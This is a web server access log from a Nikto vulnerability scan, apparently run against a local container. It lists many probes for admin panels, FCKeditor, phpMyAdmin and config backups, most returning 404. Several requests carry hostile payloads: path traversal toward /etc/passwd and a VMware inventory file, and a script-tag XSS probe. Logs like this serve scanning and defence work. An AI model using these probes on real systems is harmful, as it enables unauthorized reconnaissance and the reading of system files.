172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /ur-admin.php HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006400)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /ur-admin/ HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006401)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /useradmin/ HTTP/1.1" 404 465 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006402)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /UserLogin/ HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006403)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /utility_login/ HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006404)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /v2/painel/ HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006405)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /vadmind/ HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006406)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /vmailadmin/ HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006407)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /webadmin.asp HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006408)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /webadmin.html HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006409)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /webadmin.php HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006410)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /webmaster/ HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006411)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /websvn/ HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006412)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /wizmysqladmin/ HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006413)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /wp-admin/ HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006414)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /wp-login/ HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006415)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /xlogin/ HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006416)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /yonetici.asp HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006417)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /yonetici.html HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006418)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /yonetici.php HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006419)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /yonetim.asp HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006420)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /yonetim.html HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006421)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /yonetim.php HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006422)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /test.asp HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006423)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /test.aspx HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006424)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /test.php HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006425)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /maintenance.asp HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006426)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /maintenance.aspx HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006427)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /maint/ HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006429)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /maint.asp HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006430)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /maint.aspx HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006431)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /sdk/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/etc/vmware/hostd/vmInventory.xml HTTP/1.1" 400 485 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006432)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET <script>alert(1)</script> / HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /jk-status HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006434)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /balancer-manager HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006435)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /servlets-examples/ HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006437)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /admin-console HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006438)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /webmail/src/configtest.php HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006439)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /help.php HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006442)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /wordpress/ HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006443)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /forum/faq.php?s=&do=search&q=database&match=all&titlesonly=0 HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006445)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /faq.php?s=&do=search&q=database&match=all&titlesonly=0 HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006446)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /wconnect/admin.html HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006447)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /open.txt HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006448)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /fx29id1.txt HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006449)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /fx29id2.txt HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006450)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /gif/hp_invent_logo.gif HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006451)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /gif/tricolor_ink_guage.gif HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006452)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /logon/logonServlet HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006453)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /AdobeDocumentServicesSec/Config/bindings?wsdl&style=http HTTP/1.1" 404 531 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006454)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /services HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006455)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /happyaxis.jsp HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006456)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /bcb/bcbadmSystemInfo.jsp HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006457)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /bcb/bcbadmStart.jsp HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006458)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /GRMGHeartBeat/HTTPGRMGTest.html HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006459)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /meSync/HttpGRMGTest.html HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006460)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /htmlb/index.html HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006461)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /SQLTrace/index.html HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006462)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /TestJDBC_Web/TestJDBCPage.jsp HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006463)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /uddiclient/jsps/index.jsp HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006464)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /~/index.html HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006465)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /webdynpro/welcome/Welcome.jsp HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006466)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /sites/ HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006467)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /FCKeditor/editor/filemanager/browser/default/frmupload.html HTTP/1.1" 404 550 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006468)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /Script/fckeditor/editor/filemanager/browser/default/frmupload.html HTTP/1.1" 404 557 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006468)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /sites/all/modules/fckeditor/fckeditor/editor/filemanager/browser/default/frmupload.html HTTP/1.1" 404 578 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006468)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /modules/fckeditor/fckeditor/editor/filemanager/browser/default/frmupload.html HTTP/1.1" 404 568 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006468)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /class/fckeditor/editor/filemanager/browser/default/frmupload.html HTTP/1.1" 404 556 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006468)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /inc/fckeditor/editor/filemanager/browser/default/frmupload.html HTTP/1.1" 404 554 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006468)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /sites/all/libraries/fckeditor/editor/filemanager/browser/default/frmupload.html HTTP/1.1" 404 570 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006468)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /FCKeditor/license.txt HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006469)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /Script/fckeditor/license.txt HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006469)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /sites/all/modules/fckeditor/fckeditor/license.txt HTTP/1.1" 404 540 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006469)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /modules/fckeditor/fckeditor/license.txt HTTP/1.1" 404 530 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006469)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /class/fckeditor/license.txt HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006469)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /inc/fckeditor/license.txt HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006469)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /sites/all/libraries/fckeditor/license.txt HTTP/1.1" 404 532 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006469)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /FCKeditor/fckconfig.js HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006470)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /Script/fckeditor/fckconfig.js HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006470)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /sites/all/modules/fckeditor/fckeditor/fckconfig.js HTTP/1.1" 404 541 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006470)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /modules/fckeditor/fckeditor/fckconfig.js HTTP/1.1" 404 531 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006470)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /class/fckeditor/fckconfig.js HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006470)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /inc/fckeditor/fckconfig.js HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006470)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /sites/all/libraries/fckeditor/fckconfig.js HTTP/1.1" 404 533 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006470)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /FCKeditor/_whatsnew.html HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006471)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /Script/fckeditor/_whatsnew.html HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006471)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /sites/all/modules/fckeditor/fckeditor/_whatsnew.html HTTP/1.1" 404 543 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006471)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /modules/fckeditor/fckeditor/_whatsnew.html HTTP/1.1" 404 533 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006471)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /class/fckeditor/_whatsnew.html HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006471)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /inc/fckeditor/_whatsnew.html HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006471)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /sites/all/libraries/fckeditor/_whatsnew.html HTTP/1.1" 404 535 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006471)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /FCKeditor/editor/filemanager/browser/default/browser.html HTTP/1.1" 404 548 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006472)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /Script/fckeditor/editor/filemanager/browser/default/browser.html HTTP/1.1" 404 555 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006472)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /sites/all/modules/fckeditor/fckeditor/editor/filemanager/browser/default/browser.html HTTP/1.1" 404 576 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006472)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /modules/fckeditor/fckeditor/editor/filemanager/browser/default/browser.html HTTP/1.1" 404 566 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006472)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /class/fckeditor/editor/filemanager/browser/default/browser.html HTTP/1.1" 404 554 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006472)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /inc/fckeditor/editor/filemanager/browser/default/browser.html HTTP/1.1" 404 552 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006472)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /sites/all/libraries/fckeditor/editor/filemanager/browser/default/browser.html HTTP/1.1" 404 568 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006472)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /reportserver/ HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006473)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /j2ee/examples/servlets/ HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006474)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /j2ee/examples/jsp/ HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006475)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /messages/ HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006476)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /console-selfservice/ HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006478)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /axis2/axis2-web/HappyAxis.jsp HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006479)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "POST /search.php HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006480)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "POST /private.php HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006481)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /en-GB/debug/sso HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006482)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /en-US/debug/sso HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006483)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /default.htm HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006484)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /axis2/axis2-web/HappyAxis.jsp HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006485)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /axis2/services/Version?xsd=../../../../../../../../../../../etc/passwd HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006486)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /Util/login.aspx HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006487)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /3rdparty/phpMyAdmin/setup HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006488)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /phpMyAdmin/setup HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006488)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /3rdparty/phpmyadmin/setup HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006488)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /phpmyadmin/setup HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006488)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /pma/setup HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006488)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /jsp/ HTTP/1.1" 404 495 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006489)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /portal/console/ HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006490)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /network/cgi/network.cgi HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006491)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /sitefinity/Login.aspx HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006492)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /cms/ HTTP/1.1" 404 495 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006493)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /helpdesk/ HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006494)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /3rdparty/phpMyAdmin/ HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006495)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /phpMyAdmin/ HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006495)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /3rdparty/phpmyadmin/ HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006495)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /phpmyadmin/ HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006495)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /pma/ HTTP/1.1" 404 494 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006495)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /admin/install/phpinfo.php HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006496)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /portal/binary/junk/ HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006497)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /portal/webservice/ HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006498)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /console/login/LoginForm.jsp HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006499)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /home/?vhelp HTTP/1.1" 404 495 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006500)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /servlet/snoopservlet HTTP/1.1" 404 475 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006501)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /servlet/hitcount HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006502)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /keepalive.htm HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006503)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /Admin/ HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006504)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /services/ HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006505)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web.config.bak HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006506)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web.config.back HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006507)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web.config.backup HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006508)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web.config.old HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006509)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web.config.orig HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006510)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web.config~ HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006511)"
